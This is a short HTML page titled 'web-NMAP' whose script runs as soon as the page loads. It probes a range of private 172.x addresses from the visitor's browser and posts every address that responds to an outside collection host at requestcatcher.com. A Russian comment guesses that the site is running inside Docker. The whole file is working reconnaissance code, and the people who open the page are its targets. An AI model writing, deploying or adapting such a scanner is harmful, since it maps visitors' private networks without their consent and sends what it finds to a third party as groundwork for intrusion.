<!DOCTYPE html>
<html>

<head>
    <title>web-NMAP</title>
    <meta charset="utf-8">
</head>

<body>

    <script>
        'use strict'

        function sendInfo(ip) {
            fetch(`https://l.requestcatcher.com/ip`, {
                method: 'POST',
                mode: 'no-cors',
                signal: AbortSignal.timeout(3000),
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 'ip': ip })
            });
        }
        function scan() {
            for (let subnet = 1; subnet < 40; ++subnet) {
                for (let device = 1; device < 10; ++device) {
                    let address = `172.${subnet}.0.${device}`; // Мы же точно не знаем где находится наш сайт, а кто будет запускать сайт не в докере
                    fetch('http://' + address, { method: 'GET', mode: 'no-cors', signal: AbortSignal.timeout(5000) })
                        .then(resp => {
                            sendInfo(address);
                        })
                }
            }
        }
        scan();
    </script>
</body>

</html>
